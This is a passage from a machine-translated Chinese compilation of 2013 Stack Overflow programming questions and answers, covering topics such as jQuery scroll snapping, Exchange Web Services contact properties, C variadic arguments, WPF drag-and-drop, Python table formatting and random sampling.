在查询 2 和 4 中，我使用“SELECT ANY TABLE”、“DELETE ANY TABLE”等代替 :privilege 变量。

在查询 1 和 3 中，我使用 'SELECT'、'DELETE'、'UPDATE'、'INSERT' 代替 :privilege 变量。

# javascript - 在窗口上设置滚动时抖动

> ID：16110203
> 
> 赞同：0
> 
> 时间：2013-04-19T17:22:18.060
> 
> 标签：javascript, jquery, dom, scroll, jquery-events

编辑：

我弄清楚了问题的原因。当您使用滚动条滚动，然后以编程方式设置滚动时，滚动条会移动，这会导致浏览器根据鼠标相对于新滚动条位置的位置重新计算滚动位置。现在我正在寻找解决方案。 [这](http://www.youtube.com/watch?v=5PGYuMuGrN8&feature=youtube_gdata_player)是使用来自以下答案之一的代码的问题的 Youtube 视频。

原帖：

我试图实现窗口以等于网格中元素大小的增量滚动的效果，以便滚动看起来平滑。元素是 40px 正方形，有 4px 的填充，所以我试图以 44px 的增量滚动页面。我写了一些代码，当页面垂直滚动时效果很好。我已经为水平滚动设置了完全相同的操作（或者我认为），但是当我水平滚动时，页面来回抖动。我已经尝试过调试它，似乎每隔一秒或第三次调用滚动处理程序时，向左滚动的窗口就会被设置为一些看似随机的值。

这是代码（和[小提琴](http://jsfiddle.net/shiftyp/YJ8n3/1/)）：

```
$(function(){

    // Here is the scroll function in question

    $(window).scroll(function(){

        var lastScrollTop = $(window).scrollTop();
        var lastScrollLeft = $(window).scrollLeft();

        return function(){
            var scrollTop = $(this).scrollTop();
            var scrollLeft = $(this).scrollLeft();
            var yDir = scrollTop - lastScrollTop > 0 ? 1 : -1;
            var xDir = scrollLeft - lastScrollLeft > 0 ? 1 : -1;
            $(this).scrollTop(~yDir ? scrollTop + ((44 - ((scrollTop + 44) % 44))) : scrollTop - (scrollTop % 44));
            $(this).scrollLeft(~xDir ? scrollLeft + ((44 - ((scrollLeft + 44) % 44))) : scrollLeft - (scrollLeft % 44));
            scrollTop = lastScrollTop = $(this).scrollTop();
            scrollLeft = lastScrollLeft = $(this).scrollLeft();
        }
    }());
}); 
```

编辑：

我正在 Chrome 26.0.1410.65 btw 中对此进行测试。

编辑：

垂直滚动也会出现问题，但仅在使用滚动条而不是鼠标滚轮时才会出现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:05:09.630

在某些情况下`scrollTop - lastScrollTop`和`scrollLeft - lastScrollLeft` 为零并且会导致您的逻辑出现问题。

看到这两行

```
var yDir = scrollTop - lastScrollTop > 0 ? 1 : -1;
var xDir = scrollLeft - lastScrollLeft > 0 ? 1 : -1; 
```

假设差异大于 0，您的`xDir`变量将具有 1，并且您将 scrollLeft 设置为`scrollTop + ((44 - ((scrollTop + 44) % 44))`。

下一次迭代差异为 0，您的`xDir`变量将具有 -1，您现在将使用 `scrollLeft - (scrollLeft % 44))`. 即使滚动位置没有改变，这两个等式的计算结果也不相同。

试试这个。

```
$(function(){

    // Here is the scroll function in question

    $(window).scroll(function(){

        var lastScrollLeft = $(window).scrollLeft();
        var lastScrollTop = $(window).scrollTop();

        return function(){
            var scrollLeft = $(this).scrollLeft();
            var scrollTop = $(this).scrollTop();

            if (lastScrollLeft !== scrollLeft) {
                lastScrollLeft = scrollLeft - (scrollLeft % 44);
                $(this).scrollLeft(lastScrollLeft);               
            } 

            if (lastScrollTop !== scrollTop) {
                lastScrollTop = scrollTop - (scrollTop % 44);
                $(this).scrollTop(lastScrollTop);   
            }

       }
    }());

    // Generates the grid, ignore this part

    for(var i=0;i<50;i++){
        var row = $('<div></div>').addClass('row').appendTo('body');
        for(var j=0; j<50; j++)
            $('<span></span>').appendTo(row).addClass('cell').text(50*i+j);
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T20:20:42.713

因此，根据问题顶部所述的问题原因，我认为使用代码中的方法无法直接解决此问题。我最终使用的解决方案是实现一种虚拟滚动。我将要滚动的元素放入“视口”div 中，固定位置填充窗口区域。然后我使用'scrollTarget' div 扩展了窗口大小，并根据窗口的滚动位置以44 为增量滚动视口。看到这个[小提琴](http://jsfiddle.net/shiftyp/YJ8n3/18/)。

## Javascript

```
$(function(){

    // Here is the scroll function in question

    $(this).scroll(function(){
        var scrollTop = $(this).scrollTop();
        var scrollLeft = $(this).scrollLeft();
        $('#viewport').scrollTop(scrollTop - (scrollTop % 44));
        $('#viewport').scrollLeft(scrollLeft - (scrollLeft % 44));
    });

    // Generates the grid, ignore this part

    for(var i=0;i<50;i++){
        var row = $('<div></div>').addClass('row').appendTo('#viewport');
        for(var j=0; j<50; j++)
            $('<span></span>').appendTo(row).addClass('cell').text(50*i+j);
    }

    $('#scrollTarget').height((50 * 44) + 48)
        .width((50 * 44) + 48);
}); 
```

## HTML

```
<div id="viewport"></div>
<div id="scrollTarget"></div> 
```

## CSS

```
#viewport{
    position:fixed;
    height:100%;
    width:100%;
    overflow:hidden;
}

#scrollTarget{
    position:absolute;
}

.row{
    height:44px;
    width:2204px;
}

.row:first-child{
    height:40px;
}

.cell{
    display:inline-block;
    height:40px;
    width:40px;
    margin-top:4px;
    margin-right:4px;
    background-color:#859DE1;
    color:#0F1219;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
}

.row:first-child .cell{
    margin-top:0px;
} 
```

# c# - EWS 获取联系人 - CustomerID & Account

> ID：16110212
> 
> 赞同：0
> 
> 时间：2013-04-19T17:22:49.150
> 
> 标签：c#, contacts, exchangewebservices

```
ExchangeService service = this.GetService();
FolderId folderID = GetPublicFolderID(service, "My Address Book");
ContactsFolder folder = ContactsFolder.Bind(service, folderID);
int folderCount = folder.TotalCount;

var guid       = DefaultExtendedPropertySet.PublicStrings;
var epdCP      = new ExtendedPropertyDefinition(guid, "CustomProp", MapiPropertyType.Boolean);
var epdAccount = new ExtendedPropertyDefinition(guid, "Account", MapiPropertyType.String);
var epdCID     = new ExtendedPropertyDefinition(guid, "CustomerID", MapiPropertyType.Integer);

var view = new ItemView(folderCount);
view.PropertySet = new PropertySet(BasePropertySet.FirstClassProperties);
view.PropertySet.Add(epdCP);
view.PropertySet.Add(epdAccount);
view.PropertySet.Add(epdCID);
var contacts = service.FindItems(folderID, view);

foreach (Contact contact in contacts)
{
    bool CP;
    string Account;
    int  CID;

    contact.GetLoadedPropertyDefinitions();
    contact.TryGetProperty(epdCP, out CP);
    contact.TryGetProperty(epdAccuont, out Account);
    contact.TryGetProperty(epdCID, out CID);

    Console.WriteLine(String.Format("{0, -20} - {1} - {2}"
                                    , contact.DisplayName
                                    , contact.EmailAddresses[EmailAddressKey.EmailAddress1]
                                    , CP
                                    , Account
                                    , CID
                            ));
} 
```

目标是从公共通讯簿中获取联系信息，以便我可以将其与我们拥有的另一个程序同步。

对于公共通讯簿中的每个联系人，这将打印出 DisplayName、EmailAddress 和我的自定义属性。那里没有问题。

我遇到的问题是我似乎无法获得正确的咒语来拉动某些属性。CustomerID 和 Account 是我似乎无法提取/打印的两个示例。它们不是“自定义”，就像我没有创建它们一样。

如何通过 EWS 从联系人中获取 CustomerID 和 Account？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-24T02:21:57.123

Account 和 CustomerID 不需要 GUID。名称必须是唯一 ID：

```
var guid       = DefaultExtendedPropertySet.PublicStrings;
var epdAccount = new ExtendedPropertyDefinition(0x3A00, MapiPropertyType.String);
var epdCID     = new ExtendedPropertyDefinition(0x3A4A, MapiPropertyType.String);
var epdCP      = new ExtendedPropertyDefinition(guid, "CustomBln", MapiPropertyType.Boolean);
var epdCI      = new ExtendedPropertyDefinition(guid, "CustomInt", MapiPropertyType.Integer); 
```

现在，如果我能弄清楚为什么 MapiPropertyType.Integer 没有正确映射......自定义布尔值正确拉动，但自定义整数不是。

编辑：发现 double 有效，而 Integer 没有。

```
var epdCI      = new ExtendedPropertyDefinition(guid, "CustomInt", MapiPropertyType.Double); 
```

编辑示例：

```
ExchangeService service = this.GetService();
FolderId folderID = GetPublicFolderID(service, "My Address Book");
ContactsFolder folder = ContactsFolder.Bind(service, folderID);
int folderCount = folder.TotalCount;

var guid       = DefaultExtendedPropertySet.PublicStrings;
var epdAccount = new ExtendedPropertyDefinition(0x3A00, MapiPropertyType.String);
var epdCID     = new ExtendedPropertyDefinition(0x3A4A, MapiPropertyType.String);
var epdCBLN    = new ExtendedPropertyDefinition(guid, "CustomBln", MapiPropertyType.Boolean);
var epdCDBL    = new ExtendedPropertyDefinition(guid, "CustomDbl", MapiPropertyType.Double);

var view = new ItemView(folderCount);
view.PropertySet = new PropertySet(BasePropertySet.FirstClassProperties);
view.PropertySet.Add(epdAccount);
view.PropertySet.Add(epdCID);
view.PropertySet.Add(epdCBLN);
view.PropertySet.Add(epdCDBL);

//var searchOrFilterCollection = new List<SearchFilter>();
//searchOrFilterCollection.Add(new SearchFilter.IsEqualTo(epdCBLN, true));
//searchOrFilterCollection.Add(new SearchFilter.IsEqualTo(epdAccount, "user"));
//var filter = new SearchFilter.SearchFilterCollection(LogicalOperator.And, searchOrFilterCollection);
var filter = new SearchFilter.IsEqualTo(epdAccount, "user");

var contacts = service.FindItems(folderID, filter, view);

foreach (Contact contact in contacts)
{
    string Account;
    int  CID;
    bool CBLN;
    double CDBL;

    contact.GetLoadedPropertyDefinitions();
    contact.TryGetProperty(epdAccuont, out Account);
    contact.TryGetProperty(epdCID, out CID);
    contact.TryGetProperty(epdCBLN, out CBLN);
    contact.TryGetProperty(epdCDBL, out CDBL);

    Console.WriteLine(String.Format("{0, -20} - {1} - {2} - {3} - {4}"
                    , contact.DisplayName
                    , contact.EmailAddresses[EmailAddressKey.EmailAddress1]
                    , Account
                    , CID
                    , CBLN
                    , CDBL
            ));
} 
```

# vb.net - 如何在 Visual Basic 中自动附加到 RichTextBox

> ID：16110214
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:22:53.137
> 
> 标签：vb.net, visual-studio-2010

我尝试谷歌寻找答案，但没有找到我要找的东西。

我创建了一个非常简单的应用程序，让用户可以使用条形码扫描仪将条形码扫描成文本文件。一切正常，我只想简化一点。

最初，我有一个 textbox1.text 字段，其中会出现扫描的条形码，然后用户必须单击我放置在文本框字段旁边的“添加”按钮 (Button1.Click)，以将条形码序列附加到下面的 RichTextBox 中。好吧，用户发现每次扫描单个条形码时都必须单击“添加”按钮很乏味。

**我的问题**

扫描条形码后，有没有办法让 textbox1.text 中的文本自动附加到 RichTextBox？我想消除必须单击“添加”按钮。

这是我当前的代码（Button1.Click 按钮的代码）：

```
Dim scanData As String = TextBox1.Text

RichTextBox1.AppendText(scanData + " " + Format(TimeOfDay, "HH:mm:ss") + vbNewLine)

TextBox1.Clear()
TextBox1.Focus() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:30:18.303

首先，我将确保用户无法通过禁用`TextBox`控件 ( `TextBox1.Enabled=False`) 自己输入文本，然后将您的代码添加到`TextChanged`事件中：

```
Private Sub TextBox1_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox1.TextChanged
    Dim scanData As String = TextBox1.Text

    RichTextBox1.AppendText(scanData + " " + Format(TimeOfDay, "HH:mm:ss") + vbNewLine)

    TextBox1.Clear()
    TextBox1.Focus()
End Sub 
```

在附加到 RTB 之前，我会检查以确保条形码有效。

# c - 如何从C中的省略号获取不同类型的参数

> ID：16110217
> 
> 赞同：1
> 
> 时间：2013-04-19T17:22:55.117
> 
> 标签：c, parameters, ellipsis

我有一个函数，它使用省略号接受可变数量的不同数据类型的参数。我想知道有什么方法可以让我得到他们每个人。如果不是全部，至少将特定参数（第一个或最后一个参数）与其余参数分开，并将*va_list*与其余参数分开。
声明是这样的：

```
 int foo (char *a , ...) 
```

用法 ：

```
 result = foo ("I'm a String",2,34.56,"one more String",2323232323);

    result = foo ("I'm another String",3,"again one more String",34.62,111111111); 
```

所以，在这里（用法 1）我想从 va_list 中删除参数 '2' 并与其余部分一起制作另一个 va_list。函数声明很灵活，可以做相应的修改。
提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:46:06.013

请注意，可变参数函数必须有一种方法来确定省略号 ( `va_list`) 中的参数类型。`printf()`和`scanf()`系列函数具有指定类型的格式字符串；系统调用有一个可选的`open()`第三个参数，但它始终是`int`; 并且该`execl()`函数采用所有相同类型的参数列表，`char *`以 NULL 指针终止）。

如果你有一个功能：

```
void foo_tail(va_list args); 
```

您可以将函数编写`foo()`为：

```
int foo(char *a, ...)
{
    va_list args;
    va_start(args, a);
    int arg2 = va_arg(args, int);
    foo_tail(args);
    va_end(args);
    return arg2;
} 
```

这实现了问题的要求：

> 从得到的参数'2'中删除并与其余部分一起`va_list`制作另一个。`va_list`

是否`foo_tail()`可以解决如何处理`va_list`给出的问题是一个单独的讨论；目前尚不清楚如何区分问题中显示的两个调用，但要处理这两个调用，必须以某种方式提供该信息。如图所示的混合类型的变量列表是非常有问题的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:27:28.687

当你使用`va_arg`你得到的参数实际上是从`va_list`. 所以其余的论点已经在你的`va_list`.

但是，例如，您*不能*从列表中获取任意参数。他们必须按顺序服用。你还*必须*知道你得到的参数的实际类型。

# c# - WPF - 从放置事件中将多个文件添加到列表视图

> ID：16110221
> 
> 赞同：0
> 
> 时间：2013-04-19T17:23:00.807
> 
> 标签：c#, wpf, .net-4.0

因此，当我将多个文件拖入我的应用程序时，我的问题就出现了，并且将一个文件添加到 listView 没有问题。

当我尝试将多个文件添加到 listView 时，问题就出现了。

我希望这可能与我将文件添加到列表视图的方式有关。

当我将它们拖放到我的应用程序中时，只有第一个文件会添加到 listView 中，并且我需要将所有文件添加到列表中。

我怎样才能做到这一点？（即：我离我有多远？）

任何帮助表示赞赏！

但无论如何......这是我到目前为止所得到的：

```
 <ListView x:Name="scanQueue" ItemsSource="{Binding itemList}" Margin="0,122,0,0">
        <ListView.View>
            <GridView>
                <GridViewColumn Header="Item Name" Width="200" DisplayMemberBinding="{Binding Name}"/>
                <GridViewColumn Header="Size" Width="80" DisplayMemberBinding="{Binding Size}"/>
            </GridView>
        </ListView.View>
    </ListView> 
```

以及背后的代码：

```
 public class items
        {
            public string Name { get; set; }
            public string Size { get; set; }

        }

        public IList<items> itemList { get; set; }

        public void addToList(string name, string size)
        {
            itemList = new List<items>()
            {
               new items() {Name=name, Size=size }
            };
         } 
```

而且我认为，我在这里遇到的问题是我尝试将我的数据添加到 listView 的两列中。

所以，这就是魔法应该发生的方法：

```
 private void Window_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                FileInfo fi = new FileInfo(file);
                long byteSize = fi.Length;
                string stringSize = BytesToString(byteSize);
                string name = fi.Name;
                addToList(name, stringSize);
            }
    } 
```

我现在通读了这个并意识到我没有很好地解释这个......但我希望有人理解我的问题。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T22:25:28.747

好的，所以这比我想象的要简单得多......现在感觉很愚蠢。这可能不是我做过的最漂亮的实现。

这里的这个小美女就是暗指我的那个！

```
 scanQueue.Items.Add(new { itemName = name, itemSize = stringSize }); 
```

```
 public class items
        {
            public string itemName { get; set; }
            public string itemSize { get; set; }

        }

        List<string> test = new List<string>();

        public void Window_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            List<string> fileList = new List<string>(files);

            foreach (string file in fileList)
            {
                FileInfo fi = new FileInfo(file);
                Console.WriteLine(fi.Name);
                long byteSize = fi.Length;
                string stringSize = BytesToString(byteSize);
                string name = fi.Name;
                scanQueue.Items.Add(new { itemName = name, itemSize = stringSize });
            }
            fileList.Clear();
        } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:36:45.663

我要做的第一件事是使用 ObservableCollection，而不是使用 IList。第二件事是一旦您验证 (string[])e.Data.GetData(DataFormats.FileDrop); 按预期返回多个文件我将方法 addToList 更改为

```
public void addToList(string name, string size)
    {
        itemList.Add( new items() {Name=name, Size=size });
    } 
```

# angularjs - AngularJS 将 html 渲染为字符串

> ID：16110225
> 
> 赞同：0
> 
> 时间：2013-04-19T17:23:16.867
> 
> 标签：angularjs, ruby-on-rails-3.2, haml

在我的网络应用程序中，当我转到我的一个 url 时，angularjs 将 haml 模板作为纯文本返回给我。但是，如果我转到我的根 url，它就可以正常工作。我使用 Rails 3.2.13、AngularJS 1.1.4、Haml 来查看视图。

这是我的 app/views/layouts/application.html.haml

```
!!! 5
%html{'ng-app' => 'myproject'}
  %head
    %title MyProject
    = favicon_link_tag
    = stylesheet_link_tag 'application'
    = javascript_include_tag 'application'
    = csrf_meta_tag

    %body
      .main-background
      .app{'ng-view' => ''}
        = yield 
```

这是我的 app/assets/javascripts/main.js.coffee

```
@app = angular.module('myproject', []) 
```

这是我的 app/assets/javascripts/routes.js.coffee

```
app.config ['$routeProvider', '$locationProvider', ($routeProvider, $locationProvider) ->

  $routeProvider
  .when '/',
    templateUrl: '/assets/signin/index.haml',
    controller: 'SignInController'

  .when '/signup/:code',
    templateUrl: '/assets/signup/index.haml',
    controller: 'SignUpController',

] 
```

我在 app/assets/javascripts/controllers/ 分别有 2 个控制器。他们都是空的。我也使用 html5 推送状态，喜欢这个（push_state.js.coffee）

```
app.config ($locationProvider) ->
  $locationProvider.html5Mode true 
```

而且，我在 app/assets/templates 中有路径，我在 templateUrl 中编写了视图。

我的问题是，当我转到“/”时，angularjs 会很好地渲染我的视图，但是，当我转到第二个 url 时，它会在 span 标签中返回一个纯文本，其中包含 haml 模板。我尝试在第二个模板中仅使用一个 when 语句，结果相同。而且，问题是我应该怎么做才能正确呈现我的第二个视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T05:15:24.173

我找到了解决方案。这很奇怪，但是当我在我的模板中进行一些编辑，然后再恢复时，所有模板都会正确呈现。在这两种情况下，在编辑之前和之后，模板都具有相同的标记。

# python - 在 Python 中格式化表格中的文本

> ID：16110230
> 
> 赞同：1
> 
> 时间：2013-04-19T17:23:31.500
> 
> 标签：python, python-3.x, web-scraping, beautifulsoup, tabular

我在创建动态表以适应各种结果时遇到问题。

我写了一个屏幕刮板来从[http://finance.yahoo.com](http://finance.yahoo.com)提取股票并打印公司名称、符号和当前股价。

但是输出看起来像这样：

```
 Microsoft Corporation MSFT 29.76

 Apple Inc. AAPL 396.77

 SPDR S&P 500 SPY 155.25

 Google Inc. GOOG 787.76 
```

我希望它看起来像

```
Microsoft Corporation        MSFT      29.76

Apple Inc.                   AAPL      396.77

SPDR S&P 500                 SPY       155.25

Google Inc.                  GOOG      787.76 
```

我昨天刚开始使用 Python 并且正在使用 3.3.1

我目前的代码如下：

```
import re
import urllib.request
import cgi
from bs4 import BeautifulSoup

price = [0,0,0,0]
namesList = ["string1", "string2", "string3", "string4"]
stocksList = ["msft","aapl","spy","goog"]

def HTML():
    i = 0
    while i < len(stocksList):
        htmlPull = urllib.request.urlopen("http://finance.yahoo.com/q?s="+stocksList[i]+"&ql=1")
        htmlPull = htmlPull.read().decode('utf-8')
        regex = '<span id="yfs_l84_'+stocksList[i]+'">(.+?)</span>'
        pattern = re.compile(regex)
        price[i] = re.findall(pattern,htmlPull)
        htmlParse = BeautifulSoup(htmlPull)
        title = htmlParse.title.contents
        namesList[i] = title        
        i+=1

formatPrice(price)
formatStock(namesList)
formatOutput(namesList, stocksList, price)

def formatPrice(price):
    k=0
    while k < len(price):
        cleaner = str(price[k])
        cleaner = cleaner.replace("[","")
        cleaner = cleaner.replace("]","")
        cleaner = cleaner.replace("'","")
        price[k] = float(cleaner)
        k+=1

def formatStock(namesList):
    k = 0
    while k <len(namesList):
        capital = stocksList[k]
        capital = capital.upper()
        cleaner = str(namesList[k])
        cleaner = cleaner.replace("Summary for ", "")
        cleaner = cleaner.replace(":"," ")
        cleaner = cleaner.replace("- Yahoo! Finance'","")
        cleaner = cleaner.replace("['","")
        cleaner = cleaner.replace("]","")
        cleaner = cleaner.replace(";","")
        cleaner = cleaner.replace(capital, "")
        namesList[k] = cleaner;
        k+=1

    def formatOutput(namesList, stocksList, price):
        i = 0
        while i < len(price):
        capital = stocksList[i]
        capital = capital.upper()
        print(namesList[i],capital, price[i])
        print("")
        i+=1
HTML() 
```

尝试过 print ({0},{1},{2}.format (namesList, capital, price[i]))，各种类型的 {:<16} 变体等。它似乎只影响一行，我'试图让它根据列、表格或文本和空白应该填充的一定空间来思考。我不确定这里的解决方案到底是什么，所以我问大家:)

从我的代码可以看出，我对编程很陌生，所以如果在这段代码中有更好的方法来做任何事情，我很乐意听取更正、建议和建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:55:53.997

You want to set the width based on the longest item in the column.

In Python, you use `max` to find the largest of some group of things. So, outside the loop, you can do:

```
names_width = max(len(name) for name in namesList)
stock_width = max(len(stock) for stock in stockList) 
```

Then, format each line like you said you tried:

```
print({0:{3}}  {1:{4}}  {2}.format(namesList[i],
                                   capital,
                                   price[i],
                                   names_width,
                                   stock_width)) 
```

# python - 从列表中互斥随机抽样

> ID：16110234
> 
> 赞同：3
> 
> 时间：2013-04-19T17:23:37.957
> 
> 标签：python, random, sample, mutual-exclusion

```
input = ['beleriand','mordor','hithlum','eol','morgoth','melian','thingol'] 
```

我无法在不重复任何元素的情况下创建 X 个大小为 Y 的列表。

我一直在使用：

```
x = 3
y = 2

import random

output = random.sample(input, y)
# ['mordor', 'thingol'] 
```

但如果我重复这个，我就会重复。

我希望输出类似于

```
[['mordor', 'thingol'], ['melian', 'hithlum'], ['beleriand', 'eol']] 
```

因为我选择了`x = 3`（3 个列表）大小`y = 2`（每个列表 2 个元素）。

```
def random_generator(x,y):
    .... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T19:13:30.377

您可以简单地打乱原始列表，然后从中连续生成元素`n`组。`m`可能有可能少于或多于该数量的组。请注意，这`input`是 Python 内置函数的名称，因此我将其重命名为`words`.

```
import itertools
from pprint import pprint
import random

def random_generator(seq, n, m):
    rand_seq = seq[:]  # make a copy to avoid changing input argument
    random.shuffle(rand_seq)
    lists = []
    limit = n-1
    for i,group in enumerate(itertools.izip(*([iter(rand_seq)]*m))):
        lists.append(group)
        if i == limit: break  # have enough
    return lists

words = ['beleriand', 'mordor', 'hithlum', 'eol', 'morgoth', 'melian', 'thingol']
pprint(random_generator(words, 3, 2)) 
```

输出：

```
[('mordor', 'hithlum'), ('thingol', 'melian'), ('morgoth', 'beleriand')] 
```

迭代地生成组会更加 Pythonic。上面的函数可以很容易地变成生成器，方法是把[`yield`](http://docs.python.org/2/reference/simple_stmts.html#yield)每个组一个接一个地生成，而不是在一个相对更长的列表中返回它们：

```
def random_generator_iterator(seq, n, m):
    rand_seq = seq[:]
    random.shuffle(rand_seq)
    limit = n-1
    for i,group in enumerate(itertools.izip(*([iter(rand_seq)]*m))):
        yield group
        if i == limit: break

pprint([group for group in random_generator_iterator(words, 3, 2)]) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:25:14.953

而不是从您的列表中随机获取两件事，只需随机化您的列表并遍历它以创建您指定的维度的新数组！

```
import random
my_input = ['beleriand','mordor','hithlum','eol','morgoth','melian','thingol']
def random_generator(array,x,y):
    random.shuffle(array)
    result = []
    count = 0
    while count < x:
        section = []
        y1 = y * count
        y2 = y * (count + 1)
        for i in range (y1,y2):
            section.append(array[i])
        result.append(section)
        count += 1
    return result
print random_generator(my_input,3,2) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:29:16.303

您可以与食谱[`random.sample`](http://docs.python.org/2/library/random.html#random.sample)结合使用。`itertools.grouper`

```
input = ['beleriand','mordor','hithlum','eol','morgoth','melian','thingol']
import itertools
import random
def grouper(iterable,group_size):
    return itertools.izip(*([iter(iterable)]*group_size))

def random_generator(x,y):
    k = x*y
    sample = random.sample(input,k)
    return list(grouper(sample,y))

print random_generator(3,2)
print random_generator(3,2)
print random_generator(3,2)
print random_generator(3,2)
print random_generator(3,2)
print random_generator(3,2) 
```

一次运行，这将导致：

```
[('melian', 'mordor'), ('hithlum', 'eol'), ('thingol', 'morgoth')]
[('hithlum', 'thingol'), ('mordor', 'beleriand'), ('morgoth', 'eol')]
[('morgoth', 'beleriand'), ('melian', 'thingol'), ('hithlum', 'mordor')]
[('beleriand', 'thingol'), ('melian', 'hithlum'), ('eol', 'morgoth')]
[('mordor', 'hithlum'), ('eol', 'beleriand'), ('melian', 'morgoth')]
[('mordor', 'melian'), ('thingol', 'beleriand'), ('morgoth', 'eol')] 
```

下一次运行：

```
[('mordor', 'thingol'), ('eol', 'hithlum'), ('melian', 'beleriand')]
[('eol', 'beleriand'), ('mordor', 'melian'), ('hithlum', 'thingol')]
[('hithlum', 'mordor'), ('thingol', 'morgoth'), ('melian', 'eol')]
[('morgoth', 'eol'), ('mordor', 'thingol'), ('melian', 'beleriand')]
[('melian', 'morgoth'), ('mordor', 'eol'), ('thingol', 'hithlum')]
[('mordor', 'morgoth'), ('hithlum', 'thingol'), ('eol', 'melian')] 
```

# django - Celery 任务中的 Django get() 调用返回 32 个匹配项

> ID：16110244
> 
> 赞同：1
> 
> 时间：2013-04-19T17:23:59.967
> 
> 标签：django, celery, django-celery

我正在观察 Celery 的一个非常奇怪的错误。我的任务文件中的一些代码发出了一些我确定应该返回 1 个结果的 get 请求，但它们有时会返回 32 个结果。发生此错误时，返回的结果数始终为 32。

以下是两个不同的 get 调用的例外情况：

```
MultipleObjectsReturned: get() returned more than one User -- 
  it returned 32! Lookup parameters were {'id__exact': 9503}

MultipleObjectsReturned: get() returned more than one Avatar -- 
   it returned 32! Lookup parameters were {'id__exact': 372} 
```

对于非 celery 视图，这绝不是问题。我也在使用 johnny-cache，所以我怀疑它可能是罪魁祸首，将 get() 请求发送到 memcache 而不是数据库。有人知道发生了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-25T15:37:09.147

事实证明，这与使用 johnny-cache 和 celery 有关。删除 johnny 缓存，我们不再有任何问题。

# ios6 - Apple Maps - 查找目的地/位置 - 如何？

> ID：16110245
> 
> 赞同：0
> 
> 时间：2013-04-19T17:24:02.327
> 
> 标签：ios6, location, ios6-maps, apple-maps

我仍然是应用程序制作的菜鸟，我一直在尝试阅读 MapKit 的一些纪录片，但我仍然不知道如何做到这一点。

我在 TabBar2 上有一个文本字段，在 TabBar1 上有一个 Apple Map。如何使 TabBar2 上的文本字段可搜索地址等目的地？然后在 TabBar1 的地图上显示找到的目的地？

我希望这有点道理。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-01T01:45:19.307

一种方法是使用 MKLocalSearchClass 来搜索关键词并且也可以被欺骗来寻找地址。您需要将 MKLocalSearchHandler 合并到您的类中以生成结果。然后，您可以在地图视图中添加结果。Apple 有一个示例代码，其工作方式基本相同。它根据关键字创建搜索，并在用户位置附近显示这些关键字的位置。例如咖啡或电影等。可以更改代码以查找地址或您想要的任何其他内容。无论如何，这里是示例代码的链接，希望它能引导您走向正确的方向。

[地图搜索示例代码](http://developer.apple.com/library/ios/ipad/#samplecode/MapSearch/Introduction/Intro.html)

# javascript - 循环不够迭代时遇到问题

> ID：16110246
> 
> 赞同：4
> 
> 时间：2013-04-19T17:24:02.723
> 
> 标签：javascript, jquery, loops, for-loop

所以我对这个 FOR 循环有一个问题，我只是无法弄清楚。在这种情况下，我知道这需要至少迭代两次。该数组至少看起来像这样......

```
 dTrackerArray = {sParentValue, 1234, sParentValue, 5678} 
```

但是由于某种原因，这个 for 循环只删除了一个实例而不是所有实例。

```
 var check = $.inArray(sParentValue, dTrackerArray);
      if (check != -1) {
       for(var i = dTrackerArray.length; i > 0; i--) {
         if( dTrackerArray[i] === sParentValue ) {
          dTrackerArray.splice(i,1);
          dTrackerArray.splice(i-1,1);
          }

      }} 
```

我非常感谢我能在这里得到的任何帮助！谢谢！

编辑：第二个拼接是删除与 sParentValue “关联”的 1234。它似乎工作正常。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T17:34:00.187

问题出在for循环中。你从：开始`var i = dTrackerArray.length`，取`dTrackerArray[i]`这个元素不存在。更重要的是，您忘记了与 0 索引元素进行交互。因此，您必须将 for 循环更改为：

```
for(var i = dTrackerArray.length-1; i >= 0; i--) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:31:57.903

容易错过，但你需要`i >= 0`。

**编辑：** 虽然我认为你的主要问题是你在循环时修改了一个数组。显然，通过我的修复，您将在第二个拼接处遇到越界错误。

```
var check = $.inArray(sParentValue, dTrackerArray);
      if (check != -1) {
       for(var i = dTrackerArray.length; i >= 0; i--) {
         if( dTrackerArray[i] === sParentValue ) {
          dTrackerArray.splice(i,1);
          dTrackerArray.splice(i-1,1); //when i == 0 then exception
          }

      }} 
```

由于您知道数组的格式，因此您可以使用 while 循环来执行此操作：

```
var check = $.inArray(sParentValue, dTrackerArray);
while(check > -1)
{
  dTrackerArray.splice(check,1);
  check = $.inArray(sParentValue, dTrackerArray); 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:32:59.903

您已经使用调试器逐步完成了吗？这可能就是您需要做的所有事情来了解这里发生的事情。我会把它放在评论中，但我还没有这些特权。

# python - 需要在 python 中比较 1.5GB 左右的非常大的文件

> ID：16110252
> 
> 赞同：3
> 
> 时间：2013-04-19T17:24:20.843
> 
> 标签：python, csv, numpy, pandas, large-data-volumes

```
"DF","00000000@11111.COM","FLTINT1000130394756","26JUL2010","B2C","6799.2"
"Rail","00000.POO@GMAIL.COM","NR251764697478","24JUN2011","B2C","2025"
